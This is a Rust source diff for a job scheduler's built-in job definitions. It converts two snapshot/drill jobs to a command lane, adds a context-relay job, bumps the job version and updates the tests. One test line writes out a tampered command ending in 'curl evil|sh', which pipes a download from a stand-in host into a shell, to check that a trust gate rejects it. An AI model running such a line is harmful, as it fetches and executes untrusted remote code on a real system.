@@ -98,7 +98,10 @@ pub fn schedule_path() -> PathBuf {
 
 /// ★B2-1(W3): built-in 잡 정의 버전. 잡 내용이 바뀌면 올린다 — 부트 ensure 가 구버전 항목을 갱신하는 기준.
 /// v2: R6 W0-4/W0-5 — cycle 전자동 잡 2종(cycle-autopilot-tick·cycle-verifier-watchdog) 추가.
-const BUILTIN_JOBS_VERSION: u64 = 2;
+/// v3: v113 — phoenix-snapshot-6h·phoenix-drill-weekly push→command(893 ⓑ [heartbeat] 산문 주입 수리). master 판정
+///     (master#dc245743): 1.1.3 트레인 범프는 트랙 P 단독 1회. ⚠범프는 builtin 전부를 코드 정의로 교체한다 —
+///     운영자가 builtin 잡 문자열을 손으로 고쳤다면 그 편집은 소실된다(apply_builtin_jobs 가 경고 1줄로 가청화).
+const BUILTIN_JOBS_VERSION: u64 = 3;
 
 /// built-in 잡 정의(phoenix 인프라 + learn 학습 루프) — 팩 schedule.json 배달이 아니라 코드가 소유한다
 /// (schedule.json 이 user-owned 로 전환돼 팩 강제갱신이 사용자 잡을 보존하므로, built-in 잡 진화는 이 코드가
@@ -106,23 +109,22 @@ const BUILTIN_JOBS_VERSION: u64 = 2;
 /// 미지 필드는 serde 가 무시). text_command 는 R-CLI-4 게이트가 이 코드 정의와의 정확 일치로 신뢰한다.
 fn builtin_jobs() -> Vec<serde_json::Value> {
     vec![
+        // ★v113(893 ⓑ) phoenix 2종 = command 레인: 할 일 없는 기계 산문(`[heartbeat] …`)을 6h·주간마다 master
+        //   stdin 에 꽂던 push 를 걷었다(master 가 되묻거나 턴을 소모). 스냅샷·드릴은 데몬이 돌리면 끝나는 일이고,
+        //   `| tail` 을 뗀 이유는 실패(비0 종료)가 schedule.error 로 표면화되게 하려는 것이다(tail 은 종료 코드를 삼킨다).
         json!({
             "id": "phoenix-snapshot-6h",
             "every_minutes": 360,
-            "action": "push",
-            "to": "master",
-            "if_absent": "skip",
-            "text_command": "printf '[heartbeat] phoenix 세대 스냅샷 정기화(6h·P2-4) — 손상 치유 소스 최신화.\\n'; python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" snapshot 2>&1 | tail -3",
+            "action": "command",
+            "command": "python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" snapshot 2>&1",
             "_builtin": "phoenix",
             "_builtin_version": BUILTIN_JOBS_VERSION
         }),
         json!({
             "id": "phoenix-drill-weekly",
             "every_minutes": 10080,
-            "action": "push",
-            "to": "master",
-            "if_absent": "skip",
-            "text_command": "printf '[heartbeat] phoenix 주간 격리 드릴(원자성·중단내성 self-test·라이브 무접촉) — 실전이 첫 테스트인 상태 종료(축E E2).\\n'; python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" self-test 2>&1 | tail -5",
+            "action": "command",
+            "command": "python3 \"${CYS_PACK_DIR:-$HOME/.cys/pack}/bin/javis_state_snapshot.py\" self-test 2>&1",
             "_builtin": "phoenix",
             "_builtin_version": BUILTIN_JOBS_VERSION
         }),
@@ -262,12 +264,28 @@ fn builtin_jobs() -> Vec<serde_json::Value> {
             "_builtin": "deptreq",
             "_builtin_version": BUILTIN_JOBS_VERSION
         }),
+        // ── ★v113 A3(ISSUES B9) 본부 좌석 컨텍스트 정지선 중계 — 2분 · base_only · command 레인 ──
+        // 신규 id(버전 무관 append) — 같은 판의 v3 범프(phoenix command 레인)와 한 번에 실렸다(master#dc245743).
+        // 데몬은 context.threshold 를 **발행만** 하고 소비자가 없었다 — javis_ctx_relay tick 이 좌석 CTX
+        // (관측·자기보고 중 신선한 큰 값)가 임계를 넘을 때 1회 CSO 에 `[ctx-threshold]` 를 큐 배달한다(없으면 보류).
+        // 부서 레인은 cys-dept seed_schedule 의 `ctx-relay-tick`(마커 없는 부서 잡)이 담당 — id 를 갈라 둔
+        // 이유는 부서 데몬 ensure 가 그 잡을 예약 id 선점 충돌로 경고하지 않게 하려는 것이고, base_only 는
+        // 부서 데몬에 복제 기록된 이 잡이 같은 레인을 이중 통지하지 않게 하는 관문이다.
+        json!({
+            "id": "ctx-relay-base",
+            "every_minutes": 2,
+            "action": "command",
+            "base_only": true,
+            "command": "pk=\"${CYS_PACK_DIR:-$HOME/.cys/pack}\"; [ -f \"$pk/bin/javis_ctx_relay.py\" ] || exit 0; python3 \"$pk/bin/javis_ctx_relay.py\" tick",
+            "_builtin": "ctxrelay",
+            "_builtin_version": BUILTIN_JOBS_VERSION
+        }),
     ]
 }
 
 /// built-in 잡을 jobs 배열에 idempotent upsert(순수 — 회귀 핀). id 로 대조:
 ///   · 부재 → append(생성)
-///   · 존재 + built-in 마커(`_builtin`이 코드 정의와 일치: "phoenix"·"learn"·"cycle"·"formation"·"promote"·"deptreq") → 버전 상이 시 교체(갱신)·동버전 무접촉
+///   · 존재 + built-in 마커(`_builtin`이 코드 정의와 일치: "phoenix"·"learn"·"cycle"·"formation"·"promote"·"deptreq"·"ctxrelay") → 버전 상이 시 교체(갱신)·동버전 무접촉
 ///   · 존재 + **마커 없음/불일치(사용자가 그 id 선점)** → ★codex W3: 교체 금지(사용자 잡 보존)·경고(conflicts 반환)
 /// 반환 (changed, conflicts) — conflicts=사용자가 reserved id 를 쓴 잡 id 목록(호출측 loud 경고).
 fn apply_builtin_jobs(jobs: &mut Vec<serde_json::Value>) -> (bool, Vec<String>) {
@@ -1434,7 +1452,7 @@ mod tests {
             "id": "user-custom-job", "every_minutes": 30, "action": "push", "to": "master"
         })];
 
-        // 1차: built-in 9개(phoenix2 + learn2 + cycle2 + formation1 + promote1 + deptreq1) 생성 → changed=true.
+        // 1차: built-in 10개(phoenix2 + learn2 + cycle2 + formation1 + promote1 + deptreq1 + ctxrelay1) 생성 → changed=true.
         let (c1, conf1) = apply_builtin_jobs(&mut jobs);
         assert!(c1, "1차 ensure 는 built-in 잡을 생성해야 한다");
         assert!(conf1.is_empty(), "conflict 없음(예약 id 미선점)");
@@ -1461,7 +1479,7 @@ mod tests {
             "A1-2 대화로 부서 만들기 집행 틱 잡 생성"
         );
         assert!(ids.contains(&"user-custom-job"), "사용자 잡은 보존돼야 한다");
-        assert_eq!(jobs.len(), 10, "사용자1 + built-in9");
+        assert_eq!(jobs.len(), 11, "사용자1 + built-in10");
         // 주기 정합(typed): snapshot=6h(360), drill=7일(10080), audit=일(1440), digest=7일(10080),
         // cycle tick=매분(1), verifier watchdog=10분(10), formation heartbeat=10분(10),
         // ceo promote tick=10분(10).
@@ -1479,6 +1497,21 @@ mod tests {
         assert_eq!(period("formation-heartbeat"), Some(10), "formation heartbeat 10분");
         assert_eq!(period("ceo-promote-pending-tick"), Some(10), "promote 집행 틱 10분");
         assert_eq!(period("dept-request-tick"), Some(1), "부서 요청 집행 틱 매분");
+        assert_eq!(period("ctx-relay-base"), Some(2), "본부 컨텍스트 정지선 중계 2분");
+        // ★v113 A3 중계 계약 핀: command 레인(master stdin 무주입) · base_only(부서 데몬 복제 = 같은 레인
+        //   이중 통지 차단 — 부서는 seed 잡 ctx-relay-tick 이 담당) · 마커 ctxrelay · tick 동사 · push 필드 부재.
+        {
+            let cr = jobs
+                .iter()
+                .find(|j| j["id"].as_str() == Some("ctx-relay-base"))
+                .unwrap();
+            assert_eq!(cr["action"].as_str(), Some("command"), "중계는 command 레인 핀");
+            assert_eq!(cr["base_only"].as_bool(), Some(true), "중계는 base_only 핀");
+            assert_eq!(cr["_builtin"].as_str(), Some("ctxrelay"), "마커 ctxrelay 핀");
+            assert!(cr.get("to").is_none() && cr.get("text_command").is_none(), "중계는 push 필드 없음");
+            let cmd = cr["command"].as_str().unwrap();
+            assert!(cmd.contains("javis_ctx_relay.py") && cmd.ends_with(" tick"), "중계 command 에 tick 동사 부재");
+        }
         // ★A1-2 집행 틱 계약 핀: command 레인(master stdin 무주입) · base_only(부서 데몬 복제 실행 =
         //   이중 생성 차단 — fire 관문과 쌍) · CSO 신원 고정(env CYS_ROLE=cso — 두 가드 동시 충족) ·
         //   tick 동사 · push 계열 필드 부재 · ★표지 셸 게이트 부재(적대 2R ② — 청소가 매 틱 돌아야 한다).
@@ -1554,7 +1587,16 @@ mod tests {
         //   기존 builtin 항목을 코드 정의로 통째 교체해 **운영자 수기 편집을 무언 소실**시킨다.
         //   builtin 잡 '내용' 변경으로 범프가 정말 필요해지면 이 핀을 의식적으로 함께 고치라
         //   (그 커밋이 곧 소실 고지다).
-        assert_eq!(BUILTIN_JOBS_VERSION, 2, "BUILTIN_JOBS_VERSION 무단 범프 금지(T9)");
+        assert_eq!(BUILTIN_JOBS_VERSION, 3, "BUILTIN_JOBS_VERSION 무단 범프 금지(T9) — v3 = v113 phoenix command 레인");
+        // ★v113(893 ⓑ) 회귀 핀: phoenix 2종은 master stdin 에 산문을 꽂지 않는다(command 레인 · push 필드 부재) ·
+        //   종료 코드를 삼키는 tail 파이프 금지(실패가 schedule.error 로 떠야 한다).
+        for id in ["phoenix-snapshot-6h", "phoenix-drill-weekly"] {
+            let j = jobs.iter().find(|j| j["id"].as_str() == Some(id)).unwrap();
+            assert_eq!(j["action"].as_str(), Some("command"), "{id} 는 command 레인 핀");
+            assert!(j.get("to").is_none() && j.get("text_command").is_none(), "{id} push 필드 부재");
+            let cmd = j["command"].as_str().unwrap();
+            assert!(cmd.contains("javis_state_snapshot.py") && !cmd.contains("| tail"), "{id} tail 파이프 금지");
+        }
         // ★크리틱 B3 ① 회귀 핀: cycle 잡 2종은 push 가 아니라 command 레인이어야 한다
         //   (push 면 매분 master stdin 주입 폭주 + R-CLI-4 정확일치 게이트와 충돌).
         for id in ["cycle-autopilot-tick", "cycle-verifier-watchdog"] {
@@ -1577,7 +1619,7 @@ mod tests {
             .filter(|j| j["id"].as_str() == Some("phoenix-snapshot-6h"))
             .count();
         assert_eq!(snap_count, 1, "재실행에도 중복 생성 0");
-        assert_eq!(jobs.len(), 10, "중복 없이 10개 유지");
+        assert_eq!(jobs.len(), 11, "중복 없이 11개 유지");
 
         // 3차: 구버전(마커=0) 항목이 있으면 갱신(교체) → changed=true, 여전히 중복 0.
         for j in jobs.iter_mut() {
@@ -2281,7 +2323,11 @@ mod tests {
             "임의 명령이 built-in으로 신뢰됨"
         );
         // built-in을 변조(뒤에 명령 추가)하면 더는 신뢰 안 함.
-        let base = builtin_jobs()[0]["text_command"].as_str().unwrap().to_string();
+        // (v113: [0] phoenix-snapshot 이 command 레인이 돼 text_command 가 없다 — 첫 text_command 잡을 쓴다)
+        let base = builtin_jobs()
+            .iter()
+            .find_map(|j| j["text_command"].as_str().map(str::to_string))
+            .expect("text_command 를 가진 built-in 잡(learn)이 최소 1개");
         assert!(
             !is_trusted_builtin_text_command(&format!("{base} ; curl evil|sh")),
             "변조된 built-in이 신뢰됨"
